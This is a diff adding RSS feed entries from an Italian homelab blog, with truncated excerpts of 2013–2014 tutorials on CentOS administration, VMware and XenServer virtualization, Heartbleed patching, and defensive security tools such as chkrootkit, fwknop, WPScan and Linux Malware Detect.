+ Installare il repository EPEL   [root@centos6 ~]# rpm -Uhv http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmRipristino di http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmavvertimento: /var/tmp/rpm-tmp.T0Yctu: Header V3 RSA/SHA256 Signature, key ID 0608b895: NOKEYPreparazione in corso... ########################################### [100%]1:epel-release ########################################### [100%][root@centos6 ~]# Installare chkrootkit   [root@centos6 ~]# yum install chkrootkit Eseguire scansione chrootkit   [root@centos6 ~]# chkrootkitROOTDIR is `/&amp;#39;Checking `amd&amp;#39;.</description>
+    </item>
+    
+    <item>
+      <title>Come installare e configurare ntp server su CentOS 6</title>
+      <link>https://www.homelab.it/index.php/2014/05/19/come-installare-e-configurare-ntp-server-su-centos-6/</link>
+      <pubDate>Mon, 19 May 2014 20:44:34 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/19/come-installare-e-configurare-ntp-server-su-centos-6/</guid>
+      <description>Installare ntp server su CentOS 6 NTP (Network Time Protocol) è un protocollo che viene utilizzato per sincronizzare l’orario dei computer all’interno di una rete pubblica o privata, su linux troviamo il server ntpd e il client ntpdate
+Su Linux CentOS 6 il demone ntp è installabile tramite yum:
+[root@cento6 ~]# yum install ntp ... ... ... Running Transaction Installing : ntpdate-4.2.6p5-1.el6.centos.i686 1/2 Installing : ntp-4.2.6p5-1.el6.centos.i686 2/2 Verifying : ntp-4.</description>
+    </item>
+    
+    <item>
+      <title>fwknop-client and fwknop-server 2.6.2  packages for IPFire Linux 2.x i386 (Pakfire 2)</title>
+      <link>https://www.homelab.it/index.php/2014/05/15/fwknop-client-and-fwknop-server-2-6-2-packages-for-ipfire-linux-2-x-i386-pakfire-2/</link>
+      <pubDate>Wed, 14 May 2014 22:45:30 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/15/fwknop-client-and-fwknop-server-2-6-2-packages-for-ipfire-linux-2-x-i386-pakfire-2/</guid>
+      <description>fwknop 2.6.2 IPFire Linux addon (unofficial) tested on versions: 2.15 core update 75,76,77 with Pakfire 2.
+Download Fwknop 2.6.2 client: DOWNLOAD (MD5: 11714c99dce5171191eb6735c3a4729a )
+Fwknop 2.6.2 server: DOWNLAOD (MD5: 8e1072229f483824d51844c0b84d0b52 )
+Requirements fwknop  IPFire 2.x i386 Pakfire 2 Gpgme package  Installation fwknop Copy packets via scp client to “/opt/pakfire/tmp/” IPFire directory.
+[root@ipfire ~]# cd /opt/pakfire/tmp/[root@ipfire tmp]# lsfwknopclient-2.6.2-1.ipfire.gz[root@ipfire tmp]#[root@ipfire tmp]# tar xvfz fwknopclient-2.6.2-1.ipfire.gzfiles.tar.xzinstall.shROOTFILESuninstall.</description>
+    </item>
+    
+    <item>
+      <title>Come installare BackBox 3.x</title>
+      <link>https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/</link>
+      <pubDate>Tue, 13 May 2014 20:09:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/</guid>
+      <description>
+Nel precedente articolo ho fatto una panoramica generale della distribuzione BackBox 3.x:
+https://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/
+In questo nuovo post ho inserito due video dove spiego passo passo come installare la distribuzine su VMware Workstation, ma è applicabile anche su pc/notebook fisici.
+Installare BackBox Parte 1   Installare BackBox Parte 2   </description>
+    </item>
+    
+    <item>
+      <title>BackBox – Penetration Testing Made in Italy</title>
+      <link>https://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/</link>
+      <pubDate>Fri, 09 May 2014 23:49:45 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/</guid>
+      <description>Guida installazione: https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/
+Panoramica BackBox Backbox è una distribuzione Linux tutta italiana orientata al Penetration Testing e Vulnerability Assessment and Mitigation.
+La distribuzione nasce nel 2010 da un’idea di Raffaele Forte e ai giorni d’oggi vanta lo sviluppo di un’intera community.
+Il successo di Backbox è dovuto dovuto alla sua facilità d’uso e alle elevate performance, infatti si basa sulla distribuzione Ubuntu e come window manager utilizza XFCE.
+Da notare i bassissimi requisiti hardware:</description>
+    </item>
+    
+    <item>
+      <title>Nagios NRPE &lt;= 2.15 Remote Command Injection: Analisi, test e fix della vulnerabilità</title>
+      <link>https://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/</link>
+      <pubDate>Sat, 03 May 2014 02:01:08 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/</guid>
+      <description>Informazioni generali Qualche giorno fa è stato scovato un bug sul noto monitor d’infrastrutture Nagios, più precisamente la vurnerabilità riguarda l’agent NRPE (Nagios Remote Plugin Executor).
+============================================= - Release date: 17.04.2014 - Discovered by: Dawid Golunski - Severity: High ============================================= CVE: 2014-2913
+Nrpe è un agent che viene installato su tutte le macchine monitorare da Nagios e a seconda delle varie personalizzazioni può restituire varie informazioni, come ad esempio lo stato del disco rigido, della memoria, la funzionalità o meno di determinati servizi ecc.</description>
+    </item>
+    
+    <item>
+      <title>Proteggere il servizio SSH (e non solo) tramite la tecnica Single Packet Authorization (SPA) utilizzando il software fwknop</title>
+      <link>https://www.homelab.it/index.php/2014/04/30/proteggere-il-servizio-ssh-e-non-solo-tramite-la-tecnica-single-packet-authorization-spa-utilizzando-il-software-fwknop/</link>
+      <pubDate>Wed, 30 Apr 2014 14:32:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/30/proteggere-il-servizio-ssh-e-non-solo-tramite-la-tecnica-single-packet-authorization-spa-utilizzando-il-software-fwknop/</guid>
+      <description>Inserire uno strato di controllo (oltre al firewall) davanti ad alcuni servizi strategici, può rilevarsi molto efficace sotto l’aspetto della sicurezza.
+Prendiamo per esempio il servizio SSH, essendo un demone utilizzato esclusivamente per amministrare e dare l’accesso al sistema, perchè renderlo accessibile da tutta la rete internet?
+Esistono varie tecniche per limitare l’accesso solo a connessioni autorizzate, tra quelle più interessanti c’è il Single Packet Authorization (SPA).</description>
+    </item>
+    
+    <item>
+      <title>Installare Patch su XenServer 6.2 Free Edition</title>
+      <link>https://www.homelab.it/index.php/2014/04/26/installare-patch-su-xenserver-6-2-free-edition/</link>
+      <pubDate>Fri, 25 Apr 2014 23:57:49 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/26/installare-patch-su-xenserver-6-2-free-edition/</guid>
+      <description>Tra le varie limitazioni che caratterizzano la versione free di XenServer, spicca la mancata disponibilità di aggiornare automaticamente l’hypervisor tramite XenCenter.
+In questo articolo spiegherò come scaricare ed installare le patch passo dopo passo.
+1) Individuazione e download degli aggiornamenti 1A) Per controllare quali aggiornamenti sono disponibili per il nostro XenServer, basta cliccare sull’icona “System Alerts” in alto a destra del client XenServer:
+1B) Si aprirà una finestracon l’elenco degli aggiornamenti, selezionare la patch desiderata e cliccare sul bottone “Go to Web Page“:</description>
+    </item>
+    
+    <item>
+      <title>Heartbleed – Come installare le patch e rigenerare i certificati su VMware vSphere ESXi 5.5/5.5u1</title>
+      <link>https://www.homelab.it/index.php/2014/04/23/heartbleed-come-installare-le-patch-e-rigenerare-i-certificati-su-vmware-vsphere-esxi-5-55-5u1/</link>
+      <pubDate>Wed, 23 Apr 2014 12:51:25 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/23/heartbleed-come-installare-le-patch-e-rigenerare-i-certificati-su-vmware-vsphere-esxi-5-55-5u1/</guid>
+      <description>Il noto bug ha colpito anche i software di casa VMware, per leggere l’elenco dei prodotti potete fare riferimento al mio articolo cliccando QUESTO LINK.
+In questo articolo tratterò in particolare l’aggiornamento dell’hypervisor vSphere ESXi versione 5.5 e 5.5u1.
+La procedura si dividerà principalmente in tre punti:
+ Individuazione e download della patch adeguata Upload ed installazione della patch sul virtualizzatore Creazioni dei nuovi certificati ssl   Attenzione!</description>
+    </item>
+    
+    <item>
+      <title>Aggiornare Ubuntu dalla versione 13.10 (Saucy Salamander) alla 14.04 (Trusty Tahr) &#43; Video</title>
+      <link>https://www.homelab.it/index.php/2014/04/21/aggiornare-ubuntu-dalla-versione-13-10-saucy-salamander-alla-14-04-trusty-tahr/</link>
+      <pubDate>Mon, 21 Apr 2014 17:23:15 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/21/aggiornare-ubuntu-dalla-versione-13-10-saucy-salamander-alla-14-04-trusty-tahr/</guid>
+      <description>Il 17 Aprile 2014 è stata rilasciata la versione finale di Ubuntu 14.04 LTS (Trusty Tahr)
+Per eseguire l’upgrade dalla versione 13.10 bastano pochi e semplici passi:
+1) Preparazione del sistema La prima azione da fare è quella di aggiornare completamente l’attuale sistema Ubuntu 13.10, quindi aprire un terminale e digitare:
+$ sudo apt-get update &amp;amp;&amp;amp; sudo apt-get dist-upgrade
+2) Inizializzazione dell’aggiornamento 2A) Concluso l’upgrade della distribuzione versione 13.10, sempre dal terminale eseguire:</description>
+    </item>
+    
+    <item>
+      <title>Come aggiungere un disco locale su XenServer 6.2 senza XenCenter</title>
+      <link>https://www.homelab.it/index.php/2014/04/18/how-to-add-local-storage-to-xenserver-6-2-come-aggiungere-un-disco-locale-su-xenserver-6-2/</link>
+      <pubDate>Fri, 18 Apr 2014 18:34:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/18/how-to-add-local-storage-to-xenserver-6-2-come-aggiungere-un-disco-locale-su-xenserver-6-2/</guid>
+      <description>Per installare XenServer sul virtualizzatore ESXi (Nested Virtualization) clicca: http://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/
+ Avete creato una VM su XenServer e volete aggiungere un secondo disco locale post installazione?
+Bene, bastano pochissimi passaggi:
+1) Creazione del secondo virtual disk Tramite vSphere C#/Web Client aggiungere un nuovo virtual disk delle dimensioni desiderate:
+2) Preparazione e creazione storage Collegarsi tramite ssh alla console di XenServer e controllare la presenza del nuovo disco (/dev/sdb nella mia configurazione):</description>
+    </item>
+    
+    <item>
+      <title>Installare XenServer su vSphere ESXi 5.5 (Full Virtualization – Nested Virtualization)</title>
+      <link>https://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/</link>
+      <pubDate>Thu, 17 Apr 2014 10:02:32 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/</guid>
+      <description>Introduzione all’installazione di XenServer su ESXi 5.5 Guida passo dopo passo alla virtualizzazione dell’hypervisor XenServer 6.2 all’interno di un ambiente vSphere ESXi 5.5
+I prerequisiti li trovate a questo indirizzo:
+http://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/
+Riassunto operazioni da effettuare:
+  Creare una VM con GuestOS RHEL 6
+  Selezionare Ethernet E1000 e controller SCSI “LSI Logic Parallel”
+  Abilitare EPT/RVI MMU
+  Cambiare GuestOS in ESXi 5.x
+  Montare ISO XenServer 6.</description>
+    </item>
+    
+    <item>
+      <title>Nested Virtualization – Preparare l’ambiente vSphere ESXi 5.5 ad ospitare altri Hypervisor</title>
+      <link>https://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/</link>
+      <pubDate>Wed, 16 Apr 2014 14:59:01 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/</guid>
+      <description>Nested virtualization è la tecnica che permette di installare un hypervisor guest all’interno di altri (hosts).
+Per chi come me ha un virtual lab vSphere dovrà tenere conto di alcune direttive e requisiti hardware.
+Requisiti hardware Nested Virtualization Per poter installare un hypervisor x86/x64 in modalità hvm (Hardware-assisted virtualization – full virtualization) è obbligatorio possedere un processore sul proprio host ESXi con queste caratteristiche:
+ Intel VT-x or AMD-V (Nested supportato per VM 32bit) Intel EPT or AMD RVI (Nested supportato anche per VM 64bit)  Per capire se la nostra CPU supporta queste caratteristiche basta fare una ricerca sui siti propetari INTEL o AMD .</description>
+    </item>
+    
+    <item>
+      <title>Heartbleed VMware – Situazione di tutti i prodotti affetti dal bug</title>
+      <link>https://www.homelab.it/index.php/2014/04/13/heartbleed-situazione-dei-prodotti-vmware/</link>
+      <pubDate>Sun, 13 Apr 2014 17:36:47 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/13/heartbleed-situazione-dei-prodotti-vmware/</guid>
+      <description>Heartbleed VMware – Lista prodotti affetti dal bug: Quasi tutti i prodotti VMware rilasciati negli ultimi 2 anni utilizzano la libreria OpenSSL dalla versione 1.0.1 in poi.
+Gli ingegneri della software house sono a lavoro per trovare soluzioni opportune prodotto per prodotto, il link a cui fare riferimento è questo:
+Knowledge Base: 2076225 Updated: Apr 20, 2014
+I prodotti confermati affetti dal bug sono i seguenti:
+ ESXi 5.5 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NSX for Multi-Hypervisor Manager 4.</description>
+    </item>
+    
+    <item>
+      <title>Chromebleed – Plugin per google Chrome che rileva siti affetti dal bug Heartbleed</title>
+      <link>https://www.homelab.it/index.php/2014/04/11/chromebleed-plugin-per-google-chrome-che-rileva-siti-affetti-dal-bug-heartbleed/</link>
+      <pubDate>Fri, 11 Apr 2014 14:27:28 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/11/chromebleed-plugin-per-google-chrome-che-rileva-siti-affetti-dal-bug-heartbleed/</guid>
+      <description>I siti web più importanti e famosi sono già corsi ai ripari contro il bug Heartbleed di OpenSSL, ma come fare per visulizzare lo stato dei siti minori?
+Per google chrome ci viene in aiuto un nuovo plugin: Chromebleed
+
+Una volta installato il plugin verrà eseguito in background da chrome e in caso di navigazione verso siti affetti dal bug heartbleed, apparirà un messaggio d’errore come questo:</description>
+    </item>
+    
+    <item>
+      <title>Heartbleed – Password da cambiare (lista siti)</title>
+      <link>https://www.homelab.it/index.php/2014/04/11/heartbleed-password-da-cambiare-lista-siti/</link>
+      <pubDate>Fri, 11 Apr 2014 13:07:49 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/11/heartbleed-password-da-cambiare-lista-siti/</guid>
+      <description>E’ scoppiato il panico da cambio password, ma è davvero così necessario?!?
+La maggior parte dei social newtork o provider in generale utilizzano sessioni criptate con hash create sul momento.
+Le password non vengono salvate in chiaro, e anche se venissero copiate in memoria non lo sarebbero in maniera decrittata.
+**La cosa fondamentale da fare è eliminare i cookies dal proprio browser quindi basta fare un semplicissimo logout..
+**
+Qui di seguito potete trovare la lista dei siti più famosi nei quali è consigliato ( da parte loro) cambiare le password dopo la scoperta del bug Heartbleed (OpenSSL)</description>
+    </item>
+    
+    <item>
+      <title>Heartbleed zero day (CVE-2014-0160) OpenSSL: Consigli utili su come correre ai riapri</title>
+      <link>https://www.homelab.it/index.php/2014/04/10/heartbleed-zero-day-cve-2014-0160-openssl-consigli-utili-su-come-correre-ai-riapri/</link>
+      <pubDate>Wed, 09 Apr 2014 22:04:23 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/10/heartbleed-zero-day-cve-2014-0160-openssl-consigli-utili-su-come-correre-ai-riapri/</guid>
+      <description>Come ben sapete tra ieri ed oggi è scoppiata la bomba “Heartbleed” e a sganciarla è stato un’ingegnere che lavora presso Google: Neel Mehta.
+Heartbleed è il nome che è stato dato a una pericolosissimo bug scovato sul sistema di criptazione OpenSSL che permette di entare in possesso della chiave privata con cui sono stati firmati i certificati SSL/TLS.
+Considerato che openssl viene utilizzato dai demoni web, mail, VPN, ecc..si può capire l’enorme serietà del bug, milioni di dati personali (password, documenti, conversazioni, email) sono a rischio di divulgazione non autorizzata.</description>
+    </item>
+    
+    <item>
+      <title>Come installare Linux Malware Detect (LMD) su CentOS 6.x, schedulare scanasioni ed inviare report tramite e-mail</title>
+      <link>https://www.homelab.it/index.php/2014/04/08/come-installare-linux-malware-detect-lmd-su-centos-6-x-schedulare-scanasioni-ed-inviare-report-tramite-e-mail/</link>
+      <pubDate>Tue, 08 Apr 2014 15:13:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/08/come-installare-linux-malware-detect-lmd-su-centos-6-x-schedulare-scanasioni-ed-inviare-report-tramite-e-mail/</guid>
+      <description>Obbiettivo Installare su CentOS 6 Linux Malware Detector (LMD), shedulare scansioni ed inviare report tramite e-mail.
+Scenario Linux distro: CentOS 6.5 (x86_64)
+LMD version: 1.4.2
+Selinux: SI
+Installazione Linux Malware Detector Scaricare l’ultima versione disponibile di LMD dal sito ufficiale:
+[root@lmd_test tmp]# cd /tmp[root@lmd_test tmp]#[root@lmd_test tmp]# wget wget http://www.rfxn.com/downloads/maldetect-current.tar.gz............2014-04-07 19:53:30 (491 KB/s) - &amp;#34;maldetect-current.tar.gz&amp;#34; salvato [811467/811467] Scompattare l’archivio ed installare il software linux malware detector:</description>
+    </item>
+    
+    <item>
+      <title>CentOS: Come creare i certificati SSL/TLS autofirmati</title>
+      <link>https://www.homelab.it/index.php/2014/04/06/centos-come-creare-i-certificati-ssl/</link>
+      <pubDate>Sun, 06 Apr 2014 19:50:15 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/06/centos-come-creare-i-certificati-ssl/</guid>
+      <description>Creare certificati SSL/TLS su CentOS 6 è molto semplice grazie ad alcuni script messi a disposizione dalla distribuzione.
+Questi certificati potranno essere integrati alla configurazione di postfix, sendmail, apache, dovecot ecc…
+Scenario e requisiti Ambiente di test
+ Versione Linux: CentOS 6.5 (x86_64) Dominio: www.example.it  Prerequisiti
+ openssl  Creazione chiave e certificati  Con l’utenza di root, entrare nella directory contenente gli script e creare la chiave privata:  [root@certs_test ~]# cd /etc/pki/tls/certs [root@certs_test certs]# [root@certs_test certs]# make server.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Security: Come nascondere la lista utenti</title>
+      <link>https://www.homelab.it/index.php/2014/04/04/wordpress-security-nascondere-la-lista-utenti-da-occhi-indiscreti/</link>
+      <pubDate>Fri, 04 Apr 2014 20:30:18 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/04/wordpress-security-nascondere-la-lista-utenti-da-occhi-indiscreti/</guid>
+      <description>Installare e configurare wordpress è veramente semplice, soprattutto grazie al suo wizard user friendly.
+Come spesso accade però le configurazioni di default necessitanto di ritocchi.
+Una delle principali personalizzazioni da eseguire è quella di impedire la lettura degli utenti wordpress da remoto.
+Per testare l’importanza di questo aspetto, possiamo utilizzare il security scanner WPScan :
+[root@wpscan_test wpscan]# ./wpscan.rb --url http://www.example.it --enumerate u_________________________________________________________________ _______ _____\ \ / / __ \ / ____|\ \ /\ / /| |__) | (___ ___ __ _ _ __\ \/ \/ / | ___/ \___ \ / __|/ _` | &amp;#39;_ \\ /\ / | | ____) | (__| (_| | | | |\/ \/ |_| |_____/ \___|\__,_|_| |_|WordPress Security Scanner by the WPScan TeamVersion v2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Security: Come installare WPScan su CentOS 6</title>
+      <link>https://www.homelab.it/index.php/2014/04/04/wordpress-security-come-installare-wpscan-su-centos-6-schedulare-scansioni-ed-inviare-report-tramite-e-mail/</link>
+      <pubDate>Fri, 04 Apr 2014 14:01:27 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/04/wordpress-security-come-installare-wpscan-su-centos-6-schedulare-scansioni-ed-inviare-report-tramite-e-mail/</guid>
+      <description>Wordpress ad oggi è la piattaforma CMS più diffusa al mondo, di conseguenza anche la più analizzata sotto l’aspetto della sicurezza.
+Per testare ed escludere la propria copia di wordpress da eventuali vulnerabilità note, è possibile utilizzare il software scanner WPScan.
+Nel repository ufficiale CentOS non esiste il pacchetto precompilato di wpscan, quindi andrà scaricato e compilato manualmente.
+Scenario e requisiti Ambiente di test
+ Versione Linux: CentOS 6.5 (x86_64) Versione WPScan: 2.</description>
+    </item>
+    
+    <item>
+      <title>Installare Ruby 1.9.x su CentOS 6</title>
+      <link>https://www.homelab.it/index.php/2014/04/03/installare-ruby-1-9-x-su-centos-6/</link>
+      <pubDate>Thu, 03 Apr 2014 21:23:06 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/03/installare-ruby-1-9-x-su-centos-6/</guid>
+      <description>Obbiettivo Installare su CentOS 6.x la versione 1.9.x del linguaggio di programmazione Ruby.
+Scenario  Server Linux: CentOS 6.5 (x86_64) Repo Ruby: ruby-1.8.7.352-13.el6.x86_64.rpm New Ruby: ruby-1.9.3p545-1.el6.x86_64.rpm  Collegarsi con utenza root alla shell/terminale ed eseguire i seguenti comandi:
+# Creazione ambiente per la compilazione del pacchetto rpmmkdir -p rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}# Download ultima versione Ruby e file spec per la compilazionewget http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.3-p545.tar.gz -P rpmbuild/SOURCESwget https://raw.github.com/imeyer/ruby-1.9.3-rpm/master/ruby19.spec -P rpmbuild/SPECS# Modificare file spec per la versione appena scaricata du ruby (1.</description>
+    </item>
+    
+    <item>
+      <title>Apache 2 chroot &#43; modsecurity CentOS 6</title>
+      <link>https://www.homelab.it/index.php/2014/04/02/apache-2-chroot-modsecurity-centos-6/</link>
+      <pubDate>Wed, 02 Apr 2014 09:55:34 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/02/apache-2-chroot-modsecurity-centos-6/</guid>
+      <description>Obbiettivo Configurare il server web Apache 2.x isolato in ambiente chroot tramite il web firewall applicativo MODSECURITY .
+Scenario  Server Linux: CentOS 6.5 Server Apache: httpd-2.2.15-29 modsecurity: mod_security-2.7.3-2 Php Version: php-5.3.3-27 Directory root Chroot: (/web) Selinux: NO   Installazione dei pacchetti necessari per modsecurity ========================================================  Da utente root scaricare l’ultima versione del repository EPEL , dopo di che installare i programmi necessari tramite YUM:
+ wget http://dl.</description>
+    </item>
+    
+    <item>
+      <title>Monitorare controller RAID MegaRAID LSI 92xx su ESXi 5.x (Datastore version)</title>
+      <link>https://www.homelab.it/index.php/2014/03/28/monitorare-stato-controller-raid-megaraid-lsi-92xx-datastore-esxi-5-x/</link>
+      <pubDate>Fri, 28 Mar 2014 20:44:59 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/03/28/monitorare-stato-controller-raid-megaraid-lsi-92xx-datastore-esxi-5-x/</guid>
+      <description>Nella creazione di un buon home lab esxi non può mancare un controller raid che gestisca i dischi del datastore.
+La mia scelta è riacduta sul controller IBM M5014 equvialente al LSI MegaRAID 9260-8i.
+Una volta configurato il raid e installato il datastore per il mio ESXi 5.5, la prima domanda è stata:
+E adesso come faccio a monitorare lo stato del controller e dei dischi?
+Collegare il controller raid in passthrough a una virtual machine non è possibile dato che esxi perderebbe la connesione al Datastore.</description>
+    </item>
+    
+    <item>
+      <title>HomeLab Whitebox – VMware vSphere ESXi 5.5</title>
+      <link>https://www.homelab.it/index.php/2014/03/25/homelab-it-whitebox-vmware-vsphere-esxi-5-5/</link>
+      <pubDate>Tue, 25 Mar 2014 18:57:35 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/03/25/homelab-it-whitebox-vmware-vsphere-esxi-5-5/</guid>
+      <description>Per studiare il funzionamento dell’ambiente virtuale VMware, mi sono assemblato un virtualizzatore con Hardware di comune utilizzo (Whitebox).
+Se anche voi siete alla ricerca di hardware compatibile per creare il vostro ESXi server potrete prendere spunto dalla mia configurazione.
+Lista hardware whitebox esxi 5.5 IMMO Motherboard: Asrock 970 Extreme3 R2.0
+CPU: AMD FX 8350
+RAM: Corsair 32GB DDR3-1600MHz Vengeance Pro_(4x8GB)
+PSU: Seasonic S12II-520 Bronze
+Datastore Storage: 4 x 1TB Seagate ST1000DM003 Barracuda</description>
+    </item>
+    
+    <item>
+      <title>IPFire 2.x &#43; OpenVPN &#43; google authenticator</title>
+      <link>https://www.homelab.it/index.php/2014/03/24/ipfire-2-x-openvpn-google-authenticator/</link>
+      <pubDate>Mon, 24 Mar 2014 22:41:14 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/03/24/ipfire-2-x-openvpn-google-authenticator/</guid>
+      <description>[UPDATE: 2015-01-07]
+In questo articolo spiegherò passo dopo passo come modificare la struttura di IPFire 2 per implementare alla configurazione standard di OpenVPN, l’autenticazione OTP (One time Password) di google authenticator.
+Per configurare OpenVPN e google authenticator su IPFire 2.x basta installare il pacchetto da me creato e seguire pochi semplici passi.
+Il pacchetto (i386) e relative istruzioni d&amp;rsquo;installazione sono reperibili qui: http://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/
+La procedura che riporterò di seguito è stata testata su IPFire 2.</description>
+    </item>
+    
+    <item>
+      <title>VMware ESXi 5.5/5.5u1 su Apple Mac Mini 6.2</title>
+      <link>https://www.homelab.it/index.php/2014/03/21/esxi-5-55-5u1-su-apple-mac-mini-6-2/</link>
+      <pubDate>Fri, 21 Mar 2014 14:49:51 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/03/21/esxi-5-55-5u1-su-apple-mac-mini-6-2/</guid>
+      <description>Qualche giorno fa ho avuto la necessità di installare Esxi 5.5 sul Mac Mini 6.2 .
+Facendo varie ricerche mi sono imbattuato in qusto interessantissimo blog dove ho trovato tutto il necessario: Virtually Ghetto
+Le custom iso sono disponibili ai seguenti link:
+ ESXi-5.5-Mac-Mini-6.2.iso ESXi-5.5u1-Mac-Mini-6.2.iso  L’installazione che ho scelto è stata quella tramite pendrive usb ed ho utilizzato il tool: UNetbootin
+UNetbootin è semplicissmo da utilizzare, basta eseguire il programma (nessuna installazione), selezionare la pendrive (FORMATTATA FAT32) e l’immagine ISO scaricata.</description>
+    </item>
+    
+    <item>
+      <title>libpam-google-authenticator IPFire 2.x pack</title>
+      <link>https://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/</link>
+      <pubDate>Sun, 09 Mar 2014 23:28:43 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/03/10/libpam-google-authenticator-ipfire-2-x-pack/</guid>
+      <description>Dato che in giro non ho trovato nessun pacchetto per implementare google authenticator sulla distribuzione ipfire, ho deciso di crearmelo da solo.
+La versione è compatibile con i sistemi 32bit, ma presto metterò online la versione x64.
+Ho testato il pacchetto su IPFire 2 Core-Update-Level: 75 i586
+Download: libpam-google-authenticator-1.0-1.ipfire
+L’installazione è semplicissima, prima di tutto copiare il file libpam-google-authenticator-1.0-1.ipfire.gz tramite scp,winscp,rsync ecc… all’interno della directory “/opt/pakfire/tmp” poi eseguire i seguenti comandi:</description>
+    </item>
+    
+    <item>
+      <title>Generare certificati per VMware vCloud Director 5.5 su CentOS</title>
+      <link>https://www.homelab.it/index.php/2014/01/27/generare-certificati-vmware-vcloud-director-5-5-su-centos/</link>
+      <pubDate>Mon, 27 Jan 2014 19:04:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/01/27/generare-certificati-vmware-vcloud-director-5-5-su-centos/</guid>
+      <description>Se anche voi avete deciso di installare e configurare VMware vCloud Director 5.5 sulla vostra distribuzione CentOS, arriverete al punto di dover creare i certificati ssl per la Web GUI e la console proxy.
+Piccola premessa: Se state installando la vApp di VMware vCloud Director, i certificati verranno generati automaticamente.
+il comando è semplice:
+/opt/vmware/vcloud-director/jre/bin/keytool -genkey -keystore /opt/vmware/vcloud-director/data/transfer/certificates.ks -storetype JCEKS -storepass passwd -keyalg RSA -validity 9999 -alias http La sintassi è di facile comprensione, da notare principalmente 3 parti:</description>
+    </item>
+    
+    <item>
+      <title>LSI Megaraid 9240-8i/M1015 &#43; ESXi 5.x = loading module megaraid_sas</title>
+      <link>https://www.homelab.it/index.php/2014/01/09/lsi-megaraid-9240-8i-esxi-5-x-loading-module-megaraid_sas-esxi-5/</link>
+      <pubDate>Thu, 09 Jan 2014 18:28:28 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/01/09/lsi-megaraid-9240-8i-esxi-5-x-loading-module-megaraid_sas-esxi-5/</guid>
+      <description>loading module megaraid_sas bug Ciao a tutti,
+Se siete arrivati in questa pagina è perchè probabilmente anche voi siete incappati nella schermata che blocca il boot di esxi 5.x con il messaggio: loading module megaraid_sas
+
+Questo problema viene scaturito dall’utilizzo del controller raid LSI Megaraid 9240-8i su motherboards non supportate (come da specifiche) in particolare su workstation.
+Io ho eseguito dei test con la motherboard ASRock 970 extreme3 R2.0 con il bios versione 1.</description>
+    </item>
+    
+    <item>
+      <title>Apache Security: Nascondere la versione di Apache e PHP</title>
+      <link>https://www.homelab.it/index.php/2013/12/31/apache-security-nascondere-la-versione-di-apache-e-php/</link>
+      <pubDate>Mon, 30 Dec 2013 23:00:00 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2013/12/31/apache-security-nascondere-la-versione-di-apache-e-php/</guid>
+      <description>Identificare la versione di un demone o di un applicativo è il primo passo che un cracker esegue prima di sferrare l’attacco.
+Tengo a precisare che i vari test che andrò a mostrare sono stati effettuati su una CentOS 6 x86_64, ma con le dovute modifiche sono applicabili a qualsiasi distro Linux.
